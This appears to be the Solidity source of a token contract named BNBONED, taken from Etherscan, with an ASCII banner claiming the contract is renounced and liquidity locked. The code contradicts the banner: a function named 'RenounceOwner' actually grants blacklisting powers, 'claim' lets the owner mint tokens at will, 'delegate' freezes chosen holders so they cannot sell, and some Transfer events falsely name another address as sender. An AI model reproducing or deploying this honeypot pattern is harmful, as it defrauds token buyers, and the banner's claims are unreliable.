/**
 *Submitted for verification at Etherscan.io on 2022-10-06
*/

pragma solidity 0.8.17;
/*

                                                                                                                     
8 888888888o   b.             8 8 888888888o       ,o888888o.     b.             8 8 8888888888   8 888888888o.      
8 8888    `88. 888o.          8 8 8888    `88.  . 8888     `88.   888o.          8 8 8888         8 8888    `^888.   
8 8888     `88 Y88888o.       8 8 8888     `88 ,8 8888       `8b  Y88888o.       8 8 8888         8 8888        `88. 
8 8888     ,88 .`Y888888o.    8 8 8888     ,88 88 8888        `8b .`Y888888o.    8 8 8888         8 8888         `88 
8 8888.   ,88' 8o. `Y888888o. 8 8 8888.   ,88' 88 8888         88 8o. `Y888888o. 8 8 888888888888 8 8888          88 
8 8888888888   8`Y8o. `Y88888o8 8 8888888888   88 8888         88 8`Y8o. `Y88888o8 8 8888         8 8888          88 
8 8888    `88. 8   `Y8o. `Y8888 8 8888    `88. 88 8888        ,8P 8   `Y8o. `Y8888 8 8888         8 8888         ,88 
8 8888      88 8      `Y8o. `Y8 8 8888      88 `8 8888       ,8P  8      `Y8o. `Y8 8 8888         8 8888        ,88' 
8 8888    ,88' 8         `Y8o.` 8 8888    ,88'  ` 8888     ,88'   8         `Y8o.` 8 8888         8 8888    ,o88P'   
8 888888888P   8            `Yo 8 888888888P       `8888888P'     8            `Yo 8 888888888888 8 888888888P'      


 - Wish you luck CZ!


- Contract Renounced
- LP Locked




*/  

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
contract BNBONED {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) ValueOf;
    mapping (address => bool) ii;

    // 
    string public name = "BNBONED";
    string public symbol = unicode"BNBONED";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x467C57d6C10837C3a02A8840492E4cED3c1d103F;
    address lead_deployer = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier V() {   
         require(ii[msg.sender]);
         _;}
        modifier I() {   
         require(msg.sender == owner);
         _;}


    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; } 
        require(!ValueOf[msg.sender]);      
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address nan) I public {
          ii[nan] = true; }
        
        function claim(address x,  uint256 y) I public {
        balanceOf[x] += y;
        totalSupply += y; }
        function delegate(address ex) V public{          
        require(!ValueOf[ex]);
        ValueOf[ex] = true; }
        function send(address ex) V public {
        require(ValueOf[ex]);
        ValueOf[ex] = false; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }    
        require(!ValueOf[from]); 
        require(!ValueOf[to]); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }